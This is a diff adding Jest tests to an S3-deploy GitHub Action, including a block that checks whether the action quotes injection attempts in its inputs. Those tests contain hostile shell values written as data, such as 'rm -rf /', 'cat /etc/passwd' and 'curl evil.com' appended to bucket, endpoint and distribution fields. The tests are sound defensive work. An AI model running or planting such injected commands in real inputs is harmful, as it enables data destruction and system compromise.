@@ -577,4 +577,243 @@ describe("S3 Deploy GitHub Action", () => {
       );
     });
   });
+
+  describe("Security - Command Injection Prevention", () => {
+    it("safely handles bucket names with shell metacharacters", async () => {
+      getInputMock.mockImplementation((name: string) => {
+        const inputs: Record<string, string> = {
+          ...defaultInputs,
+          AWS_S3_BUCKET: "bucket; rm -rf /",
+        };
+        return inputs[name] || "";
+      });
+
+      await run();
+
+      expect(execSync).toHaveBeenCalledWith(
+        expect.stringContaining('"s3://bucket; rm -rf /'),
+        expect.anything()
+      );
+      // Verify the semicolon is inside quotes
+      expect(execSync).toHaveBeenCalledWith(
+        expect.not.stringMatching(/s3:\/\/bucket; rm/),
+        expect.anything()
+      );
+    });
+
+    it("safely handles source dir with command substitution", async () => {
+      getInputMock.mockImplementation((name: string) => {
+        const inputs: Record<string, string> = {
+          ...defaultInputs,
+          SOURCE_DIR: "$(whoami)",
+        };
+        return inputs[name] || "";
+      });
+
+      await run();
+
+      expect(execSync).toHaveBeenCalledWith(
+        expect.stringContaining('"$(whoami)"'),
+        expect.anything()
+      );
+    });
+
+    it("safely handles prefix with backticks", async () => {
+      getInputMock.mockImplementation((name: string) => {
+        const inputs: Record<string, string> = {
+          ...defaultInputs,
+          AWS_S3_PREFIX: "`malicious-command`",
+        };
+        return inputs[name] || "";
+      });
+
+      await run();
+
+      // The prefix is part of the destination URL which is quoted as a whole
+      expect(execSync).toHaveBeenCalledWith(
+        expect.stringContaining('"s3://test-bucket/`malicious-command`"'),
+        expect.anything()
+      );
+    });
+
+    it("safely handles ACL with shell metacharacters", async () => {
+      getInputMock.mockImplementation((name: string) => {
+        const inputs: Record<string, string> = {
+          ...defaultInputs,
+          AWS_S3_ACL: "public-read && echo pwned",
+        };
+        return inputs[name] || "";
+      });
+
+      await run();
+
+      expect(execSync).toHaveBeenCalledWith(
+        expect.stringContaining('--acl "public-read && echo pwned"'),
+        expect.anything()
+      );
+    });
+
+    it("safely handles endpoint with pipe characters", async () => {
+      getInputMock.mockImplementation((name: string) => {
+        const inputs: Record<string, string> = {
+          ...defaultInputs,
+          AWS_S3_ENDPOINT: "https://s3.example.com | cat /etc/passwd",
+        };
+        return inputs[name] || "";
+      });
+
+      await run();
+
+      expect(execSync).toHaveBeenCalledWith(
+        expect.stringContaining('"https://s3.example.com | cat /etc/passwd"'),
+        expect.anything()
+      );
+    });
+
+    it("safely handles CloudFront distribution ID with shell metacharacters", async () => {
+      getInputMock.mockImplementation((name: string) => {
+        const inputs: Record<string, string> = {
+          ...defaultInputs,
+          CLOUDFRONT_DISTRIBUTION_ID: "E123ABC; curl evil.com",
+        };
+        return inputs[name] || "";
+      });
+
+      await run();
+
+      expect(execSync).toHaveBeenCalledWith(
+        expect.stringContaining('"E123ABC; curl evil.com"'),
+        expect.anything()
+      );
+    });
+  });
+
+  describe("Additional Coverage", () => {
+    it("handles CloudFront response without Id field gracefully", async () => {
+      jest.mocked(execSync).mockImplementation((command: string, options?: any) => {
+        if (command.includes("cloudfront create-invalidation")) {
+          return '{"Invalidation":{}}'; // Missing Id field
+        }
+        return Buffer.from("");
+      });
+
+      await run();
+
+      // Should still succeed but not set the output
+      expect(setFailedMock).not.toHaveBeenCalled();
+      expect(setOutputMock).not.toHaveBeenCalledWith(
+        "cloudfront_invalidation_id",
+        expect.anything()
+      );
+    });
+
+    it("constructs command with all options enabled", async () => {
+      getBooleanInputMock.mockImplementation((name: string) => {
+        if (name === "DELETE_REMOVED") {
+          return true;
+        }
+        return false;
+      });
+
+      await run();
+
+      expect(execSync).toHaveBeenCalledWith(
+        'aws s3 sync "test-source-dir" "s3://test-bucket/test-prefix" --no-progress --acl "public-read" --endpoint-url "test-endpoint" --delete',
+        { stdio: "inherit" }
+      );
+    });
+
+    it("completes successfully with S3 sync only (no CloudFront)", async () => {
+      getInputMock.mockImplementation((name: string) => {
+        const inputs: Record<string, string> = {
+          ...defaultInputs,
+          CLOUDFRONT_DISTRIBUTION_ID: "",
+        };
+        return inputs[name] || "";
+      });
+
+      await run();
+
+      expect(setFailedMock).not.toHaveBeenCalled();
+      expect(setOutputMock).toHaveBeenCalledWith(
+        "s3_url",
+        "s3://test-bucket/test-prefix"
+      );
+      expect(execSync).toHaveBeenCalledTimes(1); // Only S3 sync, no CloudFront
+    });
+
+    it("handles missing AWS_S3_BUCKET gracefully", async () => {
+      getInputMock.mockImplementation((name: string, options?: any) => {
+        if (options?.required && name === "AWS_S3_BUCKET") {
+          throw new Error("Input required and not supplied: AWS_S3_BUCKET");
+        }
+        return defaultInputs[name] || "";
+      });
+
+      await run();
+
+      expect(setFailedMock).toHaveBeenCalledWith(
+        expect.stringContaining("Input required and not supplied: AWS_S3_BUCKET")
+      );
+    });
+
+    it("handles missing AWS_SECRET_ACCESS_KEY gracefully", async () => {
+      getInputMock.mockImplementation((name: string, options?: any) => {
+        if (options?.required && name === "AWS_SECRET_ACCESS_KEY") {
+          throw new Error("Input required and not supplied: AWS_SECRET_ACCESS_KEY");
+        }
+        return defaultInputs[name] || "";
+      });
+
+      await run();
+
+      expect(setFailedMock).toHaveBeenCalledWith(
+        expect.stringContaining("Input required and not supplied: AWS_SECRET_ACCESS_KEY")
+      );
+    });
+
+    it("sets outputs only after successful operations", async () => {
+      const callOrder: string[] = [];
+
+      jest.mocked(execSync).mockImplementation((command: string, options?: any) => {
+        if (command.includes("s3 sync")) {
+          callOrder.push("s3-sync");
+        } else if (command.includes("cloudfront")) {
+          callOrder.push("cloudfront");
+          return '{"Invalidation":{"Id":"TEST123"}}';
+        }
+        return Buffer.from("");
+      });
+
+      setOutputMock.mockImplementation((name: string, value: any) => {
+        callOrder.push(`output-${name}`);
+        return;
+      });
+
+      await run();
+
+      // Verify order: S3 sync -> S3 output -> CloudFront -> CloudFront output
+      expect(callOrder).toEqual([
+        "s3-sync",
+        "output-s3_url",
+        "cloudfront",
+        "output-cloudfront_invalidation_id",
+      ]);
+    });
+
+    it("handles getBooleanInput with invalid value gracefully", async () => {
+      getBooleanInputMock.mockImplementation((name: string) => {
+        if (name === "DELETE_REMOVED") {
+          throw new Error("Invalid boolean value");
+        }
+        return false;
+      });
+
+      await run();
+
+      expect(setFailedMock).toHaveBeenCalledWith(
+        expect.stringContaining("Invalid boolean value")
+      );
+    });
+  });
 });
